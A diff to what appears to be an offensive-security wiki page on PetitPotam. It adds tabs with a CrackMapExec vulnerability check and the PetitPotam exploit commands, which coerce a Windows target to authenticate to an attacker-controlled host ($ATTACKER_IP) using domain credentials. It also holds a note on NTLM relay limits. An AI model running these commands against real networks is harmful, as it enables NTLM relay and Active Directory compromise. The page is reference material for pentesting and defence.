@@ -15,6 +15,16 @@ The following MS-EFSR's methods were detected vulnerable
 
 ## Practice
 
+{% tabs %}
+{% tab title="Enumerate" %}
+[CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec) (Python) can be used to check if the target is vulnerable to PetitPotam.
+
+```bash
+crackmapexec smb $IP -u $USER -p $PASSWORD -M petitpotam -o PIPE=netlogon
+```
+{% endtab %}
+
+{% tab title="Exploit" %}
 An authentication can be forced with the original author's proof-of-concepts dubbed "[PetitPotam](https://github.com/topotam/PetitPotam)" (available in C and Python) by using a valid AD account's credentials.
 
 ```bash
@@ -24,8 +34,10 @@ Petitpotam.py -d $DOMAIN -u $USER -p $PASSWORD $ATTACKER_IP $TARGET_IP
 An alternative Python implementation ([https://github.com/ly4k/PetitPotam](https://github.com/ly4k/PetitPotam)) can be used to exploit other unpatched methods that the original implementation doesn't feature.
 
 ```bash
-petitpotam.py -method AddUsersToFile $TARGET_IP '\\$ATTACKER_IP\share\foo'
+petitpotam.py -method AddUsersToFile -pipe netlogon $TARGET_IP '\\$ATTACKER_IP\share\foo'
 ```
+{% endtab %}
+{% endtabs %}
 
 {% hint style="info" %}
 **Nota bene**: coerced NTLM authentications made over SMB restrict the possibilities of [NTLM relay](../ntlm/relay.md). For instance, an "unsigning cross-protocols relay attack" from SMB to LDAP will only be possible if the target is vulnerable to CVE-2019-1040 or CVE-2019-1166.
@@ -50,8 +62,6 @@ For the proof of concept to work, using a proper security provider (`RPC_C_AUTHN
 {% embed url="https://github.com/topotam/PetitPotam" %}
 
 {% embed url="https://github.com/ly4k/PetitPotam" %}
-&#x20;
-{% endembed %}
 
 {% embed url="https://blog.compass-security.com/2020/05/relaying-ntlm-authentication-over-rpc" %}
 Understand RPC better
